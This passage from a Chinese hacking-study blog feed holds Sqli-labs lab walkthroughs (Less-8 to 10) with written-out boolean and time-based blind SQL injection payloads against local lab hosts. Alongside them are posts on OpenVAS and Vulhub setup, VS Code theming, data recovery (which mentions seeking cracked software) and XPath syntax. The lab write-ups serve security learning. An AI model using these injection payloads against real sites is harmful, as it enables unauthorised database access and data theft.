<p>查询出来了第一个列是<code>id</code>其他的列就不查询<br>4. 查询数据内容<br>通过上面的查询知道了库明，表明，列明<br>就可以查询数据了<br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select id from security.emails LIMIT 0,1 ),1)=&#39;2&#39; --+ </code><br>结果是1<br>输入2没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813134431665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入1显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813134551222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  (<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> security.emails <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> )  regexp <span class="string">&#x27;^1&#x27;</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select id from security.emails LIMIT 0,1 )  like &#x27;</span><span class="number">1</span>%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> security.emails <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> ),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">49</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select id from security.emails LIMIT 0,1 ) ,1,1))=49  --+ </span></span><br></pre></td></tr></table></figure>
<p>数据库内容是结果是1</p>
<p><strong>这样查询非常麻烦</strong></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs Less9-10时间盲注</title>
    <url>/2020/09/23/Sqli-labs%20Less9%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h2><p>输入and来判断不管输入什么都显示一样<br>输入url地址<code>http://192.168.31.94/Less-9/?id=2&#39; and 1=1 --+</code><br>还是显示<code>You are in...........</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200923103155.png"><br>输入url地址<code>http://192.168.31.94/Less-9/?id=2&#39;</code><br>还是一样显示<code>You are in...........</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200923103319.png"><br>直到用到sql时间盲注<br>输入url地址<code>http://192.168.31.94/Less-9/?id=1 &#39;  and if(left(user(),1)=&#39;q&#39;,0,sleep(5))  --+ </code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200923103927.png">   </p>
<h3 id="读取当前数据库"><a href="#读取当前数据库" class="headerlink" title="读取当前数据库"></a>读取当前数据库</h3><p>这个太麻烦而且还慢可以自己<br>写一个sql时间盲注脚本应为我时间不多，有时间在写</p>
<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>下面这个测试我就把前面的文件的测试的给复现下来了<br>第10关<br>输入<code>http://192.168.0.102/Less-10/?id=1</code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122521235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39;</code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122700875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39; and &#39;1&#39; =&#39; 1  --+ </code><br>返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122815430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-10/?id=1&#39; and &#39;1&#39; =&#39; 2  --+ </code><br>还是返回返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814122857588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>192.168.0.102/Less-10/?id=1&#39; )  or  (&#39;a&#39;=&#39;a  --+</code><br>还是返回还是返回返回<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200814123200314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等等等等等等等等等等等等等其他方法我就不演示了<br>发现根本就没有注入点</p>
<h3 id="读取当前数据库-1"><a href="#读取当前数据库-1" class="headerlink" title="读取当前数据库"></a>读取当前数据库</h3><p>这个太麻烦而且还慢可以自己<br>写一个sql时间盲注脚本应为我时间不多，有时间在写</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>VM虚拟机安装OpenVAS</title>
    <url>/2020/12/15/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85OpenVAS/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="安装配置要求如下"><a href="#安装配置要求如下" class="headerlink" title="安装配置要求如下"></a>安装配置要求如下</h2><ul>
<li>类型：Linux</li>
<li>版本：其他Linux（64位）</li>
<li>内存：4 GB</li>
<li>硬盘：18 GB</li>
<li>CPU：2</li>
</ul>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p> 官方地址<br><a href="https://www.openvas.org/">https://www.openvas.org/</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214194911.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214195025.png"></p>
<h2 id="vm安装"><a href="#vm安装" class="headerlink" title="vm安装"></a>vm安装</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214195557.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214195732.png"><br>应为我不知道是什么内核就选其他的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214200417.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214195950.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214200010.png"></p>
<h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-243.png"><br>默认”NO”用键盘左右键，选择”YES“<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-242.png"><br>在安装等一会<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-244.png"><br>设置用户名<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215110344.png"><br>设置密码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215110402.png"><br>是否重启选是<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215110438.png"><br>提示是否弹出OpenVAS的CD光盘选是<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215110501.png"><br>重启完输入用户名密码<br>如果没有ip可以，登录进入后重启一下，就有了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215111141.png"><br>选择是<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-254.png"></p>
<p>叫你设置登录用户名和密码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215111512.png"></p>
<p>设置完后按键盘Tab键选择ok<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215111550.png"></p>
<p>需要密钥，选择跳过<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215111721.png"></p>
<p>运行状态说明，提示未安装Feed，就是漏洞库，直接回车<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112204.png"></p>
<p>我们去安装漏洞库<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112450.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112512.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112528.png"></p>
<p>这样就开始更新了然后点一下ok<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112550.png"></p>
<p>点ok<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113501.png"></p>
<p>查看一下配置去<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113648.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113712.png"><br>限制正在更新等等就完了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113839.png"><br>等一会返回上一次在进去看看出现这个就更新好了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215115538.png"><br>这个就安装好了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215143622.png"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>openvas</category>
      </categories>
      <tags>
        <tag>openvas</tag>
      </tags>
  </entry>
  <entry>
    <title>VisualStudioCodebe背景和美化</title>
    <url>/2020/10/13/VisualStudioCode%E8%83%8C%E6%99%AF%E5%92%8C%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="编辑框背景照片"><a href="#编辑框背景照片" class="headerlink" title="编辑框背景照片"></a>编辑框背景照片</h2><p>在商城搜索<code>background</code><br>安装<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013101522.png"></p>
<p>进入设置进行配置<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013101625.png"></p>
<p>搜索<code>Plugin</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013101755.png"><br>编辑<br>里面代码全部替换为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//background 的相关配置</span></span><br><span class="line">&quot;update.enableWindowsBackgroundUpdates&quot;: true,</span><br><span class="line">&quot;background.customImages&quot;: [</span><br><span class="line">	<span class="string">&quot;file:///照片路径&quot;</span></span><br><span class="line">],</span><br><span class="line">&quot;background.enabled&quot;: true,</span><br><span class="line">&quot;background.style&quot;: &#123;</span><br><span class="line">    &quot;content&quot;: &quot;&#x27;&#x27;&quot;,</span><br><span class="line">    &quot;pointer-events&quot;: &quot;none&quot;,</span><br><span class="line">    &quot;position&quot;: &quot;absolute&quot;,</span><br><span class="line">    &quot;z-index&quot;: &quot;99999&quot;,</span><br><span class="line">    &quot;width&quot;: &quot;100%&quot;,</span><br><span class="line">    &quot;height&quot;: &quot;100%&quot;,</span><br><span class="line">    &quot;background-position&quot;: &quot;center&quot;,</span><br><span class="line">    &quot;background-repeat&quot;: &quot;no-repeat&quot;,</span><br><span class="line">    &quot;background-attachment&quot;:&quot;fixed&quot;,</span><br><span class="line">   &quot; background-size&quot;: &quot;cover&quot;,</span><br><span class="line">    &quot;opacity&quot;: 0.35</span><br><span class="line">&#125;,</span><br><span class="line">&quot;background.useFront&quot;: true,</span><br><span class="line">&quot;background.useDefault&quot;: false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013102450.png"></p>
<h2 id="设置全背景照片"><a href="#设置全背景照片" class="headerlink" title="设置全背景照片"></a>设置全背景照片</h2><p>商城搜索<code>background-cover</code><br>下载<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013102751.png"><br>安装好后就可以安装<code>ctrl+shift+p</code>搜索输入<code>backgroundCover - start</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013103014.png"><br>点击就可以配置了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013103153.png"><br>透明我设置的是<code>0.8</code><br>主题是<code>GitHub Theme</code><br>效果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201013114558.png"></p>
]]></content>
      <categories>
        <category>美化</category>
      </categories>
      <tags>
        <tag>美化</tag>
      </tags>
  </entry>
  <entry>
    <title>kali linux的Vulhub靶场环境搭建</title>
    <url>/2020/12/11/Vulhub%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>Vulhub的github地址<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></strong></p>
<h2 id="什么是Vulhub"><a href="#什么是Vulhub" class="headerlink" title="什么是Vulhub"></a>什么是Vulhub</h2><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像</p>
<h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><p>kali可以直接用下面这个命令进行下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install python3-pip</span><br></pre></td></tr></table></figure>
<p>如果是其他的其他可以用下面进行下载和安装<br>下载官方:<a href="https://pypi.org/project/pip/#files">https://pypi.org/project/pip/#files</a><br>运行下面这个命令进行下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3  get-pip.py</span><br></pre></td></tr></table></figure>

<h2 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h2><p>用pip进行下载上面已经说这么安装pip了<br>下载命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209105045.png"></p>
<p>或者用这个下载也可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install  docker-compose </span><br></pre></td></tr></table></figure>
<h2 id="下载vulhub"><a href="#下载vulhub" class="headerlink" title="下载vulhub"></a>下载vulhub</h2><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>
<p>应为下载慢我就用了科学上网下载的比较快<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209105701.png"></p>
<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>kali安装运行下面这个命令就可以直接安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209104838.png"></p>
<p>如果是其他的linux可以用下面这个命令安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br></pre></td></tr></table></figure>
<h2 id="启动docker和测试"><a href="#启动docker和测试" class="headerlink" title="启动docker和测试"></a>启动docker和测试</h2><p>启动命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p>测试命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<p>输出这个说明就可以用了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209113726.png"></p>
<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><p>进入目录可以看见有很多的测试的环境<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211183839.png"><br>下面我就启动<code>weblogic/ssrf/</code>靶场<br>进入目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd weblogic&#x2F;ssrf&#x2F;</span><br></pre></td></tr></table></figure>
<p>文件内容<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211184118.png"><br>启动命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>运行完之后他就去下载镜像和，启动容器了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211184248.png"></p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>Docker容器搭建</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化数据恢复</title>
    <url>/2021/01/25/Windowshf/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>我在配置分区的时候不小心叫硬盘格式化了，里面的东西很终于很多我看到书籍，笔记和写的代码</strong></p>
<p>然后我就用很多恢复软件进行恢复</p>
<h1 id="DiskGenius恢复"><a href="#DiskGenius恢复" class="headerlink" title="DiskGenius恢复"></a>DiskGenius恢复</h1><p>我就在网上找专业破解版的，找了很时间终于找到了，然后扫描恢复扫了20多分钟然后恢复程序崩溃了nm然后，我又启动又等了20多分钟快到扫完的时候又崩溃了nm2，然后又去找破解版的又找了很长时间终于找到了，然后扫描格式化的文件然后扫出来了但是不能复制输出nm3，尝试了好几次能复制出来文件夹不能复制出来文件</p>
<p>最后弄到了凌晨1了我只能睡觉了</p>
<p>第二天在B站找到一个英文版的视频地址[<a href="https://www.bilibili.com/video/BV1wg4y1i78g?t=342%5D%5D(https://www.bilibili.com/video/BV1wg4y1i78g?t=342)%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80">https://www.bilibili.com/video/BV1wg4y1i78g?t=342]](https://www.bilibili.com/video/BV1wg4y1i78g?t=342)里面有下载地址</a></p>
<p>然后发现又能扫描出来格式化的文件但是不能恢复</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20210125172016770.png" alt="image-20210125172016770"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20210125172045459.png" alt="image-20210125172045459"></p>
<h1 id="DiskGeniusd恢复"><a href="#DiskGeniusd恢复" class="headerlink" title="DiskGeniusd恢复"></a>DiskGeniusd恢复</h1><p>我在群里面他的这个问题有一个认识的群友就给我说了这个软件DiskGeniusd</p>
<p>我就去下载果然还是不错叫我的书籍和代码笔记给恢复了但是，有的程序打不开了</p>
<p>最后还是用的DiskGeniusd叫少量的数据给恢复的</p>
<p>DiskGeniusd很好找在网上一搜就有</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/%E6%8D%95%E8%8E%B72.PNG" alt="捕获2"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/%E6%8D%95%E8%8E%B73.PNG" alt="捕获3"><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/%E6%8D%95%E8%8E%B76.PNG" alt="捕获6"></p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>解析库XPath的语法</title>
    <url>/2021/08/20/XPath/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>学习总结</p>
</div>



<div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>XPath( XML Path Language)，他是在html和xml中查找信息的语言,他是通过标签属性来查询</p>
</div>



<h1 id="谷歌安装XPath插件和说明"><a href="#谷歌安装XPath插件和说明" class="headerlink" title="谷歌安装XPath插件和说明"></a>谷歌安装XPath插件和说明</h1><p>名称<code>XPath Helper</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820104511190.png" alt="image-20210820104511190"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820104544136.png" alt="image-20210820104544136"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820104555070.png" alt="image-20210820104555070"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820105845926.png" alt="image-20210820105845926"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>按Shift+鼠标上下可以调整位置</p>
</div> 



<h1 id="XPath语法"><a href="#XPath语法" class="headerlink" title="XPath语法"></a>XPath语法</h1><table>
<thead>
<tr>
<th align="left">表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">//</td>
<td>查询的父标签，比如<code>//div</code>就是查询这个页面的全部是div的标签</td>
</tr>
<tr>
<td align="left">/</td>
<td>查询的子标签，比如<code>//div/span</code>就会叫<code>div</code>标签下的<code>span</code>子标签</td>
</tr>
<tr>
<td align="left">[@xxx]</td>
<td>指定标签里面属性来查询，比如<code>//div[@class]</code>就是查询<code>div</code>标签里面带<code>class</code>属性的</td>
</tr>
<tr>
<td align="left">/@xxx</td>
<td>指定查询的属性内容，比如<code>//a/img/@src</code> 意思就是要<code>a</code>标签下的<code>img</code>里面的<code>src</code>属性的内容，可以用来提取照片</td>
</tr>
<tr>
<td align="left">.</td>
<td>当前节点</td>
</tr>
<tr>
<td align="left">..</td>
<td>选取当前节点的父节点</td>
</tr>
</tbody></table>
<h2 id="查询的父标签"><a href="#查询的父标签" class="headerlink" title="//查询的父标签"></a>//查询的父标签</h2><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>比如我想查看他的上映日期，他的标签是<code>span</code></p>
</div> 



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820143934513.png" alt="image-20210820143934513"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>那我语法就可以用<code>//</code>查询全部的的<code>span</code>标签里面的内容，</p>
</div> 

<p>可以看见他会叫全部的<code>span</code>标签的全部的数据都显示出来了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820144247618.png" alt="image-20210820144247618"></p>
<h2 id="查询的子标签"><a href="#查询的子标签" class="headerlink" title="/查询的子标签"></a>/查询的子标签</h2><p>上面的<code>//</code>他是输出的是全部</p>
<p>我们就可以用<code>/</code>指定输出里面的子标签</p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>我们可以他的父标签是<code>div</code>子标签是<code>span</code></p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820145652208.png" alt="image-20210820145652208"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>那我们就可以用<code>//</code>指定父标签<code>/</code>指定子标签，可以看见下面的查询的结果就少了</p>
</div> 

<p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;要指定的父标签&#x2F;要指定的子标签</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820150113015.png" alt="image-20210820150113015"></p>
<h2 id="xxx-指定查询属性"><a href="#xxx-指定查询属性" class="headerlink" title="[@xxx]指定查询属性"></a>[@xxx]指定查询属性</h2><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>上面我们看见<code>//</code>指定父标签<code>/</code>指定子标签查询的结果还是有点多我们可以通过<code>[@xxx]</code>指定查询标签里面的属性来查询</p>
<p>可以看下面他有一个<code>property=&quot;v:initialReleaseDate&quot;</code>属性我们就可以通过这个属性来查询了</p>
</div> 

<p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[@要查询的属性名]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820152347021.png" alt="image-20210820152347021"></p>
<p>可以看见这样就搜索出来时间了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div&#x2F;span[@property&#x3D;&quot;v:initialReleaseDate&quot;]</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820152445231.png" alt="image-20210820152445231"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>父标签也是可以指定的</p>
</div> 

<p>比如想要<code>豆瓣成员常用的标签 · · · · · ·</code>的标签，我们就可以下面这样写</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820153520090.png" alt="image-20210820153520090"></p>
<p>我们就可以这样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;div[@class&#x3D;&quot;tags-body&quot;]&#x2F;a  # div是父标签 class&#x3D;&quot;tags-body&quot;是父标签的属性  a是子标签</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210820153917538.png" alt="image-20210820153917538"></p>
<h2 id="指定查询的属性内容"><a href="#指定查询的属性内容" class="headerlink" title="@指定查询的属性内容"></a>@指定查询的属性内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#x2F;&#x2F;a[class&#x3D;&quot;nbgnbg&quot;]&#x2F;img&#x2F;@src&#96;  # 意思就是要&#96;a&#96;标签里面有&#96;class&#x3D;&quot;nbgnbg&quot;&#96;属性下的&#96;img&#96;里面的&#96;src&#96;属性的内容</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210821185317596.png" alt="image-20210821185317596"></p>
